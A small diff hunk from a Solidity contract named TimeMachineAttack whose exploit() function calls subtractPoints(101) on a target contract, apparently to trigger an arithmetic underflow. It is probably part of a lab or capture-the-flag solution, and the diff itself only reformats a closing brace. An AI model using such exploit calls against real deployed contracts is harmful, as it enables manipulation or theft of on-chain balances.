@@ -16,5 +16,5 @@ contract TimeMachineAttack {
 
     function exploit() public {
         timeMachine.subtractPoints(101);
-    }
+}
 }
